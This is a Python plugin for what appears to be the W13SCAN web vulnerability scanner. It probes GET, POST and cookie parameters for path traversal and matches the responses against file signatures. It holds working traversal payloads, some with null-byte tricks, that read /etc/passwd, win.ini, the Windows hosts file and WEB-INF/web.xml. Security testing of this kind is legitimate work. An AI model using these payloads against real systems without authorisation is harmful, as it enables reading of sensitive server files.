#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/8 12:31 PM
# @Author  : w8ay
# @File    : directory_traversal.py
import copy
import re
from urllib.parse import unquote

import requests

from lib.core.common import paramsCombination, generateResponse
from lib.core.data import conf
from lib.core.enums import HTTPMETHOD, PLACE, OS, WEB_PLATFORM, VulType
from lib.core.output import ResultObject, output
from lib.core.plugins import PluginBase


class W13SCAN(PluginBase):
    name = '路径穿越插件'

    def generate_payloads(self):
        payloads = []
        default_extension = ".jpg"
        payloads.append("../../../../../../../../../../../etc/passwd%00")
        payloads.append("/etc/passwd")
        if OS.LINUX in self.response.os or OS.DARWIN in self.response.os or conf.level >= 4:
            payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
            payloads.append(
                "../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
        if OS.WINDOWS in self.response.os:
            payloads.append("../../../../../../../../../../windows/win.ini")
            # if origin:
            #     payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
            payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
        if WEB_PLATFORM.JAVA in self.response.programing:
            payloads.append("/WEB-INF/web.xml")
            payloads.append("../../WEB-INF/web.xml")
        return payloads

    def audit(self):

        headers = self.requests.headers

        plainArray = [
            "; for 16-bit app support",
            "[MCI Extensions.BAK]",
            "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.",
            "# localhost name resolution is handled within DNS itself.",
            "[boot loader]"
        ]

        regexArray = [
            '(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)',
            '(root:.*:.*:)',
            "System\.IO\.FileNotFoundException: Could not find file\s'\w:",
            "System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s'\w:",
            "<b>Warning<\/b>:\s\sDOMDocument::load\(\)\s\[<a\shref='domdocument.load'>domdocument.load<\/a>\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s<b>.*?<\/b>\son\sline\s<b>\d+<\/b>",
            "(<web-app[\s\S]+<\/web-app>)"
        ]
        iterdatas = []
        if self.requests.method == HTTPMETHOD.GET:
            iterdatas.append((self.requests.params, PLACE.GET))
        elif self.requests.method == HTTPMETHOD.POST:
            iterdatas.append((self.requests.post_data, PLACE.POST))
        if conf.level >= 3:
            iterdatas.append((self.requests.cookies, PLACE.COOKIE))

        for item in iterdatas:
            iterdata, positon = item
            for k, v in iterdata.items():
                if ("." in v or "/" in v) or (k.lower() in ['filename', 'file', 'path', 'filepath']):
                    data = copy.deepcopy(iterdata)
                    payloads = self.generate_payloads()
                    for payload in payloads:
                        data[k] = payload
                        params = paramsCombination(data, positon)
                        if positon == PLACE.GET:
                            r = requests.get(self.requests.netloc, params=params, headers=headers)
                        elif positon == PLACE.POST:
                            r = requests.post(self.requests.url, data=params, headers=headers)
                        elif positon == PLACE.COOKIE:
                            if self.requests.method == HTTPMETHOD.GET:
                                r = requests.get(self.requests.url, headers=headers, cookies=params)
                            elif self.requests.method == HTTPMETHOD.POST:
                                r = requests.post(self.requests.url, data=self.requests.post_data, headers=headers,
                                                  cookies=params)
                        html1 = r.text
                        for plain in plainArray:
                            if plain in html1:
                                result = ResultObject(self)
                                result.init_info(self.requests.url, "目录穿越导致任意文件被读取", VulType.PATH_TRAVERSAL)
                                result.add_detail("payload探测", r.reqinfo, generateResponse(r),
                                                  "探测payload:{},并发现回显{}".format(data[k], plain), k, data[k], positon)
                                output.success(result)
                                return
                        for regex in regexArray:
                            if re.search(regex, html1, re.I | re.S | re.M):
                                result = ResultObject(self)
                                result.init_info(self.requests.url, "目录穿越导致任意文件被读取", VulType.PATH_TRAVERSAL)
                                result.add_detail("payload探测", r.reqinfo, generateResponse(r),
                                                  "探测payload:{},并发现正则回显{}".format(data[k], regex), k, data[k], positon)
                                output.success(result)
                                return
